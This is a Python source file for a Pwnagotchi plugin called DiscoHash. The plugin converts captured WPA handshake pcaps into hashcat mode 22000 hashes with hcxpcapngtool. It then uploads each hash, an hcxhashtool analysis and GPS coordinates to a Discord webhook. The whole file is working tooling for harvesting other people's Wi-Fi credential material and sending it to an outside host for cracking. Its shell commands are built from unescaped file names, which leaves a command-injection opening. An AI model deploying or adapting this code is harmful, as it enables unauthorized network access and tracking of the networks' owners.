from datetime import datetime
from threading import Lock
from pwnagotchi.utils import StatusFile
import pwnagotchi.plugins as plugins
import os
import json
import logging
import requests
import subprocess
import pwnagotchi

class DiscoHash(plugins.Plugin):
    __author__ = 'v0yager'
    __changed__ = 'Kilg00re'
    __version__ = '1.2.1'
    __license__ = 'GPL3'
    __description__ = '''
                DiscoHash extracts hashes from pcaps (hashcat mode 22000) using hcxpcapngtool,
                analyzes the hash using hcxhashtool, and posts the output to Discord along with 
                any obtained GPS coordinates.
                '''

    def __init__(self):
        self.ready = False
        self.lock = Lock()
        try:
            self.report = StatusFile('/root/.discohash_uploads', data_format='json')
        except JSONDecodeError:
            os.remove("/root/.discohash_uploads")
            self.report = StatusFile('/root/.discohash_uploads', data_format='json')
        self.options = {}
        self.skip = []

    def on_loaded(self):
        if not self.options.get('webhook_url'):
            logging.error("DiscoHash: Can't run without Discord webhook URL.")
            return
        self.ready = True
        logging.info("DiscoHash: Plugin loaded successfully.")

    def on_internet_available(self, agent):
        if not self.ready or self.lock.locked():
            return

        with self.lock:
            config = agent.config()
            display = agent.view()
            fingerprint = agent.fingerprint()
            reported = self.report.data_field_or('reported', default=[])
            handshake_dir = config['bettercap']['handshakes']

            new_hash_files = self.get_new_hash_files(handshake_dir, reported)
            if new_hash_files:
                logging.info("DiscoHash: Uploading new handshakes to Discord.")
                for idx, hashfile in enumerate(new_hash_files):
                    display.on_uploading(f"Discord ({idx + 1}/{len(new_hash_files)})")
                    self.process_and_upload(hashfile, reported, fingerprint)

    def get_new_hash_files(self, handshake_dir, reported):
        handshake_filenames = os.listdir(handshake_dir)
        hashes_files = [
            os.path.join(handshake_dir, filename) for filename in handshake_filenames if filename.endswith('.22000')
        ]
        return set(hashes_files) - set(reported)

    def process_and_upload(self, hashfile, reported, fingerprint):
        try:
            with open(hashfile, 'r') as hash_val:
                hash_data = hash_val.read()
            if not hash_data:
                return

            analysis = subprocess.getoutput(f'hcxhashtool -i {hashfile.split(".")[0]}.22000 --info=stdout')
            lat, lon, loc_url = self.get_coordinates(hashfile.split('.')[0])

            data = self.prepare_webhook_data(hash_data, analysis, lat, lon, loc_url, fingerprint)
            requests.post(self.options['webhook_url'], json=data)

            reported.append(hashfile)
            self.report.update(data={'reported': reported})
            logging.info("DiscoHash: Successfully uploaded handshake to Discord.")
        except Exception as e:
            logging.error(f"DiscoHash: An error occurred while processing and uploading: {e}")

    def prepare_webhook_data(self, hash_data, analysis, lat, lon, loc_url, fingerprint):
        return {
            'embeds': [
                {
                    'title': f'(ᵔ◡◡ᵔ) {pwnagotchi.name()} sniffed a new hash!',
                    'color': 289968,
                    'url': f'https://pwnagotchi.ai/pwnfile/#!{fingerprint}',
                    'description': '__**Hash Information**__',
                    'fields': [
                        {'name': 'Hash:', 'value': f'`{hash_data}`', 'inline': False},
                        {'name': 'Hash Analysis:', 'value': f'```{analysis}```', 'inline': False},
                        {'name': '__**Location Information**__', 'value': f'[GPS Waypoint]({loc_url})', 'inline': False},
                        {'name': 'Raw Coordinates:', 'value': f'```{lat},{lon}```', 'inline': False},
                    ],
                    'footer': {'text': f'Pwnagotchi - DiscoHash Plugin v{self.__version__}'},
                }
            ]
        }

    def on_epoch(self, agent, epoch, epoch_data):
        config = agent.config()
        handshake_dir = config['bettercap']['handshakes']
        self.process_pcaps(handshake_dir)

    def process_pcaps(self, handshake_dir):
        handshakes = [os.path.join(handshake_dir, filename) for filename in os.listdir(handshake_dir) if filename.endswith('.pcap')]
        successful, lonely = [], []

        for handshake in handshakes:
            if not self.write_hash(handshake):
                lonely.append(handshake)
            else:
                successful.append(handshake)

        logging.info(f"DiscoHash: Processed {len(handshakes)} PCAPs. Success: {len(successful)}, Lonely: {len(lonely)}")

    def write_hash(self, handshake):
        fullpath_no_ext = handshake.rsplit('.', 1)[0]
        subprocess.getoutput(f'hcxpcapngtool -o {fullpath_no_ext}.22000 {handshake} >/dev/null 2>&1')
        if os.path.isfile(f'{fullpath_no_ext}.22000'):
            logging.info(f'DiscoHash: Successfully created hash file {fullpath_no_ext}.22000')
            return True
        logging.warning(f'DiscoHash: Failed to create hash file for {handshake}')
        return False

    def get_coordinates(self, fullpath_no_ext):
        try:
            with open(f'{fullpath_no_ext}.gps.json', 'r') as gps_file:
                gps_data = json.load(gps_file)
                lat = gps_data.get('Latitude', 'NULL')
                lon = gps_data.get('Longitude', 'NULL')
        except FileNotFoundError:
            try:
                with open(f'{fullpath_no_ext}.geo.json', 'r') as geo_file:
                    geo_data = json.load(geo_file)
                    lat = geo_data['location']['lat']
                    lon = geo_data['location']['lng']
            except FileNotFoundError:
                lat, lon = "NULL", "NULL"
        
        loc_url = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
        return lat, lon, loc_url
